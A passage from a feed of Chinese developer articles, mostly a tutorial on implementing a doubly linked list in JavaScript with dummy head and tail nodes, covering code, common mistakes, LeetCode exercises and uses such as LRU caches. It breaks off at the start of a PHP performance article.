  <span class="hljs-keyword">return</span> <span class="hljs-string">`[<span class="hljs-subst">${values.join(<span class="hljs-string">' -&gt; '</span>)}</span>] (size: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.size}</span>, tail: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.tail?.val ?? <span class="hljs-string">'null'</span>}</span>)`</span>;
}
</code></pre>
<h3 data-id="heading-7">三、双向链表（双链表）实现</h3>
<h4 data-id="heading-8">1. 双链表核心实现逻辑</h4>
<h5 data-id="heading-9">（1）双链表与单链表的核心差异</h5>
<p>单链表的节点只有<code>next</code>指针（指向后继节点），只能“单向遍历”；双链表的节点新增<code>prev</code>指针（指向前驱节点），支持“双向遍历”，核心优势：</p>
<ul>
<li>
<p>删除节点时，无需遍历找前驱节点（时间复杂度从O(n)→O(1)）；</p>
</li>
<li>
<p>支持从尾部反向遍历，适配“逆序操作”场景；</p>
</li>
<li>
<p>插入/删除操作更灵活，边界处理可通过“虚拟头+虚拟尾”进一步简化。</p>
</li>
</ul>
<h5 data-id="heading-10">（2）双链表核心设计要点</h5>
<ul>
<li>
<p><strong>节点结构</strong>：每个节点包含<code>val</code>（值）、<code>prev</code>（前驱指针）、<code>next</code>（后继指针）；</p>
</li>
<li>
<p><strong>虚拟节点</strong>：同时维护<code>dummyHead</code>（虚拟头）和<code>dummyTail</code>（虚拟尾），彻底统一头尾节点的操作逻辑；</p>
</li>
<li>
<p><strong>状态同步</strong>：维护<code>size</code>（长度），且每个节点的<code>prev</code>/<code>next</code>指针必须成对更新（避免指针悬空）；</p>
</li>
<li>
<p><strong>操作原则</strong>：插入/删除时，先更新新节点的<code>prev/next</code>，再更新原链表的指针（先连后断）。</p>
</li>
</ul>
<h4 data-id="heading-11">实现步骤（基于单链表扩展）</h4>
<p><strong>前提：已掌握单链表实现</strong>，在此基础上扩展为双链表。</p>
<p><strong>第一步：扩展节点类（新增<code>prev</code>指针）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DoublyLinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;   <span class="hljs-comment">// 节点值</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 指向前驱节点的指针（新增）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 指向后继节点的指针</span>
  }
}
</code></pre>
<p><strong>第二步：扩展链表类结构（新增虚拟尾节点）</strong></p>
<ol>
<li>保留虚拟头节点（<code>dummyHead</code>）：与单链表相同</li>
<li><strong>新增虚拟尾节点（<code>dummyTail</code>）</strong>：统一尾节点操作，避免边界判断</li>
<li>初始化连接：<code>dummyHead.next = dummyTail</code>，<code>dummyTail.prev = dummyHead</code></li>
<li>初始化长度（<code>size</code>）：初始为<code>0</code></li>
</ol>
<p><strong>第三步：实现辅助方法（优化查找）</strong></p>
<ul>
<li><code>getNode(index)</code>：根据索引获取节点（优化版）
<ul>
<li>边界校验：<code>index &lt; 0 || index &gt;= size</code> 返回 <code>null</code></li>
<li><strong>优化策略</strong>：索引在前半段从头遍历，在后半段从尾遍历（最坏O(n/2)）</li>
</ul>
</li>
</ul>
<p><strong>第四步：实现插入方法（核心：<code>prev</code>和<code>next</code>成对更新）</strong></p>
<ul>
<li>
<p><code>addAtHead(val)</code>：头部插入</p>
<ol>
<li>创建新节点</li>
<li>获取原头节点（<code>dummyHead.next</code>）</li>
<li><strong>成对更新指针</strong>：
<ul>
<li>新节点：<code>prev</code>指向<code>dummyHead</code>，<code>next</code>指向原头节点</li>
<li>原头节点：<code>prev</code>指向新节点</li>
<li><code>dummyHead</code>：<code>next</code>指向新节点</li>
</ul>
</li>
<li>更新<code>size</code></li>
</ol>
</li>
<li>
<p><code>addAtTail(val)</code>：尾部插入</p>
<ol>
<li>创建新节点</li>
<li>获取原尾节点（<code>dummyTail.prev</code>）</li>
<li><strong>成对更新指针</strong>：
<ul>
<li>新节点：<code>prev</code>指向原尾节点，<code>next</code>指向<code>dummyTail</code></li>
<li>原尾节点：<code>next</code>指向新节点</li>
<li><code>dummyTail</code>：<code>prev</code>指向新节点</li>
</ul>
</li>
<li>更新<code>size</code></li>
</ol>
</li>
<li>
<p><code>addAtIndex(index, val)</code>：指定位置插入</p>
<ol>
<li>边界处理：<code>index &lt;= 0</code>调用<code>addAtHead</code>，<code>index &gt; size</code>直接返回，<code>index === size</code>调用<code>addAtTail</code></li>
<li>使用<code>getNode(index)</code>找到插入位置的后继节点（<code>nextNode</code>）</li>
<li>获取前驱节点（<code>nextNode.prev</code>）</li>
<li><strong>成对更新指针</strong>：
<ul>
<li>新节点：<code>prev</code>指向<code>prevNode</code>，<code>next</code>指向<code>nextNode</code></li>
<li><code>prevNode</code>：<code>next</code>指向新节点</li>
<li><code>nextNode</code>：<code>prev</code>指向新节点</li>
</ul>
</li>
<li>更新<code>size</code></li>
</ol>
</li>
</ul>
<p><strong>第五步：实现删除方法（核心优势：O(1)删除）</strong></p>
<ul>
<li><code>deleteAtIndex(index)</code>：删除指定位置节点
<ol>
<li>边界校验：使用<code>getNode(index)</code>获取待删除节点，无效则返回</li>
<li><strong>核心优势</strong>：直接获取前驱（<code>nodeToDel.prev</code>）和后继（<code>nodeToDel.next</code>），无需遍历</li>
<li><strong>成对更新指针</strong>：
<ul>
<li>前驱节点：<code>next</code>指向后继节点</li>
<li>后继节点：<code>prev</code>指向前驱节点</li>
<li>待删除节点：<code>prev</code>和<code>next</code>置为<code>null</code>（释放引用）</li>
</ul>
</li>
<li>更新<code>size</code></li>
</ol>
</li>
</ul>
<p><strong>第六步：实现扩展功能（双链表特有）</strong></p>
<ul>
<li><code>reverseTraverse()</code>：逆序遍历
<ol>
<li>从<code>dummyTail.prev</code>开始</li>
<li>通过<code>prev</code>指针向前遍历</li>
<li>直到<code>dummyHead</code>结束</li>
</ol>
</li>
</ul>
<p><strong>关键设计要点（相比单链表的升级）：</strong></p>
<ul>
<li>✅ <strong>双指针维护</strong>：每个节点的<code>prev</code>和<code>next</code>必须成对更新</li>
<li>✅ <strong>虚拟头+虚拟尾</strong>：彻底统一边界处理，无需维护<code>tail</code>指针</li>
<li>✅ <strong>O(1)删除优势</strong>：删除任意节点无需遍历找前驱</li>
<li>✅ <strong>双向遍历优化</strong>：根据索引位置选择遍历方向（优化查找效率）</li>
<li>✅ <strong>指针释放</strong>：删除节点后必须将<code>prev</code>和<code>next</code>置为<code>null</code></li>
</ul>
<h4 data-id="heading-12">2. 双链表完整实现</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 双链表节点类
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 节点存储的值
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DoublyLinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;       <span class="hljs-comment">// 节点值</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// 指向前驱节点的指针</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// 指向后继节点的指针</span>
  }
}

<span class="hljs-comment">/**
 * 双向链表实现（优化版：虚拟头+虚拟尾）
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDoublyLinkedList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(<span class="hljs-string">'_dummyHead'</span>); <span class="hljs-comment">// 虚拟头节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(<span class="hljs-string">'_dummyTail'</span>); <span class="hljs-comment">// 虚拟尾节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;                                       <span class="hljs-comment">// 链表长度</span>

    <span class="hljs-comment">// 初始化：虚拟头的next指向虚拟尾，虚拟尾的prev指向虚拟头</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-comment">// 约束：真实节点始终在dummyHead和dummyTail之间</span>
  }

  <span class="hljs-comment">/**
   * 判断链表是否为空
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>}
   */</span>
  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">/**
   * 辅助方法：根据索引找到对应节点（优化：判断索引位置，选择从头/尾遍历）
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 目标索引
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">DoublyLinkedNode|null</span>} 找到的节点/索引无效返回null
   */</span>
  <span class="hljs-title function_">getNode</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">let</span> current;
    <span class="hljs-comment">// 优化：索引在前半段，从头遍历；索引在后半段，从尾遍历</span>
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> / <span class="hljs-number">2</span>) {
      current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
        current = current.<span class="hljs-property">next</span>;
      }
    } <span class="hljs-keyword">else</span> {
      current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>; i &gt; index; i--) {
        current = current.<span class="hljs-property">prev</span>;
      }
    }
    <span class="hljs-keyword">return</span> current;
  }

  <span class="hljs-comment">/**
   * 获取指定索引的节点值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 目标索引
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} 节点值，索引无效返回-1
   */</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">const</span> node = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getNode</span>(index);
    <span class="hljs-keyword">return</span> node ? node.<span class="hljs-property">val</span> : -<span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">/**
   * 头部插入节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 要插入的值
   */</span>
  <span class="hljs-title function_">addAtHead</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(val);
    <span class="hljs-keyword">const</span> nextNode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>; <span class="hljs-comment">// 虚拟头的后继节点（原真实头）</span>

    <span class="hljs-comment">// 步骤1：新节点的prev指向虚拟头，next指向原真实头</span>
    newNode.<span class="hljs-property">prev</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    newNode.<span class="hljs-property">next</span> = nextNode;

    <span class="hljs-comment">// 步骤2：原真实头的prev指向新节点</span>
    nextNode.<span class="hljs-property">prev</span> = newNode;

    <span class="hljs-comment">// 步骤3：虚拟头的next指向新节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++; <span class="hljs-comment">// 长度+1</span>
  }

  <span class="hljs-comment">/**
   * 尾部插入节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 要插入的值
   */</span>
  <span class="hljs-title function_">addAtTail</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(val);
    <span class="hljs-keyword">const</span> prevNode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span>; <span class="hljs-comment">// 虚拟尾的前驱节点（原真实尾）</span>

    <span class="hljs-comment">// 步骤1：新节点的prev指向原真实尾，next指向虚拟尾</span>
    newNode.<span class="hljs-property">prev</span> = prevNode;
    newNode.<span class="hljs-property">next</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>;

    <span class="hljs-comment">// 步骤2：原真实尾的next指向新节点</span>
    prevNode.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-comment">// 步骤3：虚拟尾的prev指向新节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++; <span class="hljs-comment">// 长度+1</span>
  }

  <span class="hljs-comment">/**
   * 指定索引插入节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 插入位置
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 要插入的值
   */</span>
  <span class="hljs-title function_">addAtIndex</span>(<span class="hljs-params">index, val</span>) {
    <span class="hljs-comment">// 边界处理：index&lt;=0插头部，index&gt;size不插入</span>
    <span class="hljs-keyword">if</span> (index &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtHead</span>(val);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// index===size 插尾部</span>
    <span class="hljs-keyword">if</span> (index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtTail</span>(val);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 找到插入位置的目标节点（新节点的后继节点）</span>
    <span class="hljs-keyword">const</span> nextNode = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getNode</span>(index);
    <span class="hljs-keyword">const</span> prevNode = nextNode.<span class="hljs-property">prev</span>; <span class="hljs-comment">// 目标节点的前驱（新节点的前驱）</span>
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(val);

    <span class="hljs-comment">// 步骤1：新节点的prev指向prevNode，next指向nextNode</span>
    newNode.<span class="hljs-property">prev</span> = prevNode;
    newNode.<span class="hljs-property">next</span> = nextNode;

    <span class="hljs-comment">// 步骤2：prevNode的next指向新节点</span>
    prevNode.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-comment">// 步骤3：nextNode的prev指向新节点</span>
    nextNode.<span class="hljs-property">prev</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++; <span class="hljs-comment">// 长度+1</span>
  }

  <span class="hljs-comment">/**
   * 删除指定索引节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 要删除的索引
   */</span>
  <span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">const</span> nodeToDel = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getNode</span>(index);
    <span class="hljs-keyword">if</span> (!nodeToDel) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 索引无效直接返回</span>

    <span class="hljs-comment">// 步骤1：获取待删除节点的前驱和后继</span>
    <span class="hljs-keyword">const</span> prevNode = nodeToDel.<span class="hljs-property">prev</span>;
    <span class="hljs-keyword">const</span> nextNode = nodeToDel.<span class="hljs-property">next</span>;

    <span class="hljs-comment">// 步骤2：跳过待删除节点，连接前驱和后继</span>
    prevNode.<span class="hljs-property">next</span> = nextNode;
    nextNode.<span class="hljs-property">prev</span> = prevNode;

    <span class="hljs-comment">// 步骤3：释放待删除节点的指针（避免内存泄漏）</span>
    nodeToDel.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>;
    nodeToDel.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--; <span class="hljs-comment">// 长度-1</span>
  }

  <span class="hljs-comment">/**
   * 扩展方法：逆序遍历链表（双链表核心优势）
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number[]</span>} 逆序的节点值数组
   */</span>
  <span class="hljs-title function_">reverseTraverse</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-keyword">let</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span>; <span class="hljs-comment">// 从虚拟尾的前驱开始遍历</span>
    <span class="hljs-keyword">while</span> (current !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>) {
      result.<span class="hljs-title function_">push</span>(current.<span class="hljs-property">val</span>);
      current = current.<span class="hljs-property">prev</span>;
    }
    <span class="hljs-keyword">return</span> result;
  }
}

<span class="hljs-comment">// 双链表测试用例</span>
<span class="hljs-keyword">const</span> doublyList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDoublyLinkedList</span>();
doublyList.<span class="hljs-title function_">addAtHead</span>(<span class="hljs-number">1</span>);
doublyList.<span class="hljs-title function_">addAtTail</span>(<span class="hljs-number">3</span>);
doublyList.<span class="hljs-title function_">addAtIndex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"双链表get(1):"</span>, doublyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 输出2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"双链表逆序遍历:"</span>, doublyList.<span class="hljs-title function_">reverseTraverse</span>()); <span class="hljs-comment">// 输出[3,2,1]</span>
doublyList.<span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"双链表get(1):"</span>, doublyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 输出3</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"双链表逆序遍历:"</span>, doublyList.<span class="hljs-title function_">reverseTraverse</span>()); <span class="hljs-comment">// 输出[3,1]</span>
</code></pre>
<h4 data-id="heading-13">3. 双链表核心易错点</h4>



































<table><thead><tr><th>易错点</th><th>错误表现</th><th>修复方案</th></tr></thead><tbody><tr><td><strong>指针更新顺序错误</strong></td><td>先修改原链表指针，导致新节点指针丢失</td><td>先更新新节点的<code>prev/next</code>，再修改原链表的指针（先连后断）</td></tr><tr><td><strong>虚拟头尾未初始化</strong></td><td><code>dummyHead.next</code>/<code>dummyTail.prev</code>为null，操作时报错</td><td>初始化时必须让<code>dummyHead.next = dummyTail</code>、<code>dummyTail.prev = dummyHead</code></td></tr><tr><td><strong>遍历方向选择不当</strong></td><td>无论索引位置都从头遍历，效率低</td><td>判断索引是否小于<code>size/2</code>，选择从头/尾遍历（优化时间复杂度）</td></tr><tr><td><strong>仅更新单向指针</strong></td><td>只更新<code>next</code>不更新<code>prev</code>，导致链表断裂</td><td>插入/删除时，<code>prev</code>和<code>next</code>必须成对更新</td></tr><tr><td><strong>未释放删除节点的指针</strong></td><td>节点删除后仍有<code>prev/next</code>引用，导致内存泄漏（JS中影响小，但不规范）</td><td>删除后将节点的<code>prev/next</code>置为null</td></tr></tbody></table>
<h3 data-id="heading-14">四、实战应用场景</h3>
<h4 data-id="heading-15">1. LeetCode 经典题目</h4>
<ul>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fdesign-linked-list%2F" target="_blank" title="https://leetcode.cn/problems/design-linked-list/" ref="nofollow noopener noreferrer">707. 设计链表</a></strong>：单链表/双链表的基础实现</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Freverse-linked-list%2F" target="_blank" title="https://leetcode.cn/problems/reverse-linked-list/" ref="nofollow noopener noreferrer">206. 反转链表</a></strong>：单链表指针操作</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Freverse-linked-list-ii%2F" target="_blank" title="https://leetcode.cn/problems/reverse-linked-list-ii/" ref="nofollow noopener noreferrer">92. 反转链表 II</a></strong>：部分反转，需要定位前后节点</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flinked-list-cycle%2F" target="_blank" title="https://leetcode.cn/problems/linked-list-cycle/" ref="nofollow noopener noreferrer">141. 环形链表</a></strong>：快慢指针技巧</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flinked-list-cycle-ii%2F" target="_blank" title="https://leetcode.cn/problems/linked-list-cycle-ii/" ref="nofollow noopener noreferrer">142. 环形链表 II</a></strong>：找环入口</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flru-cache%2F" target="_blank" title="https://leetcode.cn/problems/lru-cache/" ref="nofollow noopener noreferrer">146. LRU 缓存</a></strong>：双链表 + 哈希表（经典应用）</li>
</ul>
<h4 data-id="heading-16">2. 实际应用场景</h4>
<ul>
<li><strong>LRU缓存</strong>：使用双链表维护访问顺序，O(1)时间删除任意节点</li>
<li><strong>浏览器历史记录</strong>：双链表支持前进/后退操作</li>
<li><strong>撤销/重做功能</strong>：双链表维护操作历史</li>
<li><strong>音乐播放列表</strong>：单链表实现顺序播放</li>
<li><strong>任务队列</strong>：单链表实现FIFO队列</li>
</ul>
<h4 data-id="heading-17">3. 面试高频考点</h4>
<ol>
<li><strong>指针操作</strong>：如何正确更新<code>next</code>/<code>prev</code>指针</li>
<li><strong>边界处理</strong>：空链表、单节点、头尾节点的特殊处理</li>
<li><strong>状态同步</strong>：<code>size</code>、<code>tail</code>等状态的维护</li>
<li><strong>时间复杂度优化</strong>：双链表的删除优势、虚拟节点的作用</li>
<li><strong>内存管理</strong>：指针释放、避免内存泄漏</li>
</ol>
<h3 data-id="heading-18">五、总结</h3>
<h4 data-id="heading-19">1. 单链表核心</h4>
<ul>
<li>
<p>核心属性：<code>dummyHead</code>（虚拟头）+ <code>tail</code>（尾节点）+ <code>size</code>（长度）；</p>
</li>
<li>
<p>修复关键：<code>size</code>与<code>tail</code>同步更新，对<code>null</code>敏感操作增加兜底校验；</p>
</li>
<li>
<p>避坑原则：先校验边界，再执行核心逻辑，指针操作“先连后断”。</p>
</li>
</ul>
<h4 data-id="heading-20">2. 双链表核心</h4>
<ul>
<li>
<p>核心升级：节点新增<code>prev</code>指针，新增<code>dummyTail</code>（虚拟尾）；</p>
</li>
<li>
<p>效率优势：删除节点无需找前驱，支持双向遍历；</p>
</li>
<li>
<p>操作原则：<code>prev/next</code>成对更新，遍历方向按需选择。</p>
</li>
</ul>
<p>掌握单链表和双链表的实现逻辑后，不仅能应对链表等基础题，还能扩展到环形链表、LRU缓存（双链表+哈希表）等进阶场景。建议结合测试用例反复调试，重点关注指针操作和状态同步，形成肌肉记忆。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PHP 应用性能分析 从假设到数据与修复优先级]]></title>    <link>https://juejin.cn/post/7596906923892817930</link>    <guid>https://juejin.cn/post/7596906923892817930</guid>    <pubDate>2026-01-19T23:44:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892817930" data-draft-id="7596904122866057267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PHP 应用性能分析 从假设到数据与修复优先级"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2026-01-19T23:44:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PHP 应用性能分析 从假设到数据与修复优先级
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:44:14.000Z" title="Mon Jan 19 2026 23:44:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 